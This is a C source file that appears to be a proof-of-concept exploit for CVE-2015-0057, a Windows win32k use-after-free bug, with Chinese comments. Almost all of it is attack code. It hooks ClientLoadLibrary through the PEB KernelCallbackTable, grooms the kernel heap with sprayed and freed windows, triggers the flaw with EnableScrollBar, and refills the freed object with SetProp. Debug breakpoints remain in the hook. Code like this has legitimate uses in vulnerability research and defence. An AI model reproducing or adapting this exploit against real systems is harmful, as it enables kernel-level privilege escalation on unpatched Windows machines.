#include "CVE-2015-0057.h"

HWND g_hWndFake_2015_0057[FAKE_OBJECTS + 5];
BOOL g_bFlag = FALSE;
DWORD g_dwOrgClientLoadLibrary = 0;
HWND g_hWnd_2015_0057 = NULL;
DWORD g_dwCount = 0;

BOOL Exploit_CVE_2015_0057()
{
	BOOL bRet = TRUE;

	
	if (!HookClientLoadLibrary())
	{
		bRet = FALSE;
		goto exit;
	}
	

	if (!Init_CVE_2015_0057())
	{
		bRet = FALSE;
		goto exit;
	}
	

	if (!Trigger_CVE_2015_0057())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Init_CVE_2015_0057()
{
	BOOL bRet = TRUE;
	DWORD i = 0;

	WNDCLASSEXA wc = { 0 };

	memset(&wc, 0, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.hInstance = GetModuleHandleA(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszClassName = WINDOW_CLASS_NAME1;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	wc.lpfnWndProc = WndProc_CVE_2015_0057;

	if (!RegisterClassExA(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassExA", GetLastError());
		goto exit;
	}

	// 消耗空闲内存块
	for (i = 0; i < JUNK_OBJECTS; i++)
	{
		HWND hWnd = CreateWindowExA(0,
									WINDOW_CLASS_NAME1,
									NULL,
									WS_OVERLAPPEDWINDOW,
									CW_USEDEFAULT,
									CW_USEDEFAULT,
									CW_USEDEFAULT,
									CW_USEDEFAULT,
									NULL,
									NULL,
									NULL,
									NULL);
		if (!hWnd)
		{
			bRet = FALSE;
			ShowError("CreateWindowExA", GetLastError());
			goto exit;
		}


		if (!SetProp(hWnd, (LPCSTR)(1), (HANDLE)0xAAAABBBBAAAABBBB))
		{
			bRet = FALSE;
			ShowError("SetProp", GetLastError());
			goto exit;
		}
	}

	// 创建一部分，释放其中的一部分窗口对象，以供之后的窗口对象占位
	for (i = 0; i < FAKE_OBJECTS; i++)
	{
		g_hWndFake_2015_0057[i] = CreateWindowExA(0,
												  WINDOW_CLASS_NAME1,
												  NULL,
												  WS_OVERLAPPEDWINDOW,
												  CW_USEDEFAULT,
											      CW_USEDEFAULT,
												  CW_USEDEFAULT,
												  CW_USEDEFAULT,
												  NULL,
												  NULL,
												  NULL,
												  NULL);
		if (!g_hWndFake_2015_0057[i])
		{
			bRet = FALSE;
			ShowError("CreateWindowExA", GetLastError());
			goto exit;
		}

		/*
		if (!SetProp(g_hWndFake_2015_0057[i], (LPCSTR)(1), (HANDLE)0xAAAABBBBAAAABBBB))
		{
			bRet = FALSE;
			ShowError("SetProp", GetLastError());
			goto exit;
		}*/
	}

	for (i = 1; i < FAKE_OBJECTS; i += 2)
	{
		if (!DestroyWindow(g_hWndFake_2015_0057[i]))
		{
			bRet = FALSE;
			ShowError("DestroyWindow", GetLastError());
			goto exit;
		}
	}

exit:
	return bRet;
}

BOOL Trigger_CVE_2015_0057()
{
	BOOL bRet = TRUE;
	WNDCLASSEX wc = { 0 };

	memset(&wc, 0, sizeof(WNDCLASSEX));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = DefWindowProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszClassName = WINDOW_CLASS_NAME2;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassEx(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	g_hWnd_2015_0057 = CreateWindowEx(0,
									  WINDOW_CLASS_NAME2,
									  0,
									  SBS_HORZ | WS_HSCROLL | WS_VSCROLL,
									  10,
									  10,
									  100,
									  100,
									  NULL,
									  NULL,
									  NULL,
									  NULL);

	if (!g_hWnd_2015_0057)
	{
		ShowError("CreateWindowEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ShowWindow(g_hWnd_2015_0057, SW_SHOW);
	UpdateWindow(g_hWnd_2015_0057);

	g_bFlag = TRUE;
	//触发漏洞
	if (!EnableScrollBar(g_hWnd_2015_0057, SB_CTL | SB_BOTH, ESB_DISABLE_BOTH))
	{
		ShowError("EnableScrollBar", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL HookClientLoadLibrary()
{
	BOOL bRet = TRUE;
	PDWORD dwTarFuncAddr = 0;
	DWORD dwOldProtect = 0;

	dwTarFuncAddr = GetClientLoadLibrary();
	g_dwOrgClientLoadLibrary = *dwTarFuncAddr;

	if (!VirtualProtect(dwTarFuncAddr,
						sizeof(DWORD),
						PAGE_READWRITE,
						&dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	*dwTarFuncAddr = (DWORD)MyClientLoadLibrary;
	
	if (!VirtualProtect(dwTarFuncAddr,
						sizeof(DWORD),
						dwOldProtect,
						&dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

PDWORD GetClientLoadLibrary()
{
	__asm
	{
		mov eax, fs:[0x30]			// eax = PEB
		mov eax, [eax + 0x2C]		// eax = KernelCallbackTable
		lea eax, [eax + 0x41 * 4]	// eax = ClientLoadLibrary
	}
}

DWORD MyClientLoadLibrary(DWORD arg0)
{
	if (g_bFlag)
	{
		g_dwCount++;
		if (g_dwCount == 2)
		{
			g_bFlag = FALSE;

			lHMValidateHandle pHmValidateHandle = NULL;

			pHmValidateHandle = (lHMValidateHandle)GetHMValidateHandle();

			PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(g_hWnd_2015_0057, 1);

			__asm
			{
				int 3
			}

			DestroyWindow(g_hWnd_2015_0057);	

			for (DWORD i = 1; i < FAKE_OBJECTS; i++)
			{
				SetProp(g_hWndFake_2015_0057[i], (LPCSTR)(1), (HANDLE)0xAAAABBBBAAAABBBB);
			}

			__asm
			{
				int 3
			}
		}
	}

exit:
	// ((lpClientLoadLibrary)g_dwOrgClientLoadLibrary)(arg0);
	return 0;
}

LRESULT CALLBACK WndProc_CVE_2015_0057(HWND hWnd,
									   UINT msg,
									   WPARAM wParam,
									   LPARAM lParam)
{
	switch (msg)
	{
		case WM_CLOSE:
		{
			DestroyWindow(hWnd);
			break;
		}
		case WM_DESTROY:
		{
			PostQuitMessage(0);
			break;
		}
	}

	return DefWindowProc(hWnd, msg, wParam, lParam);
}
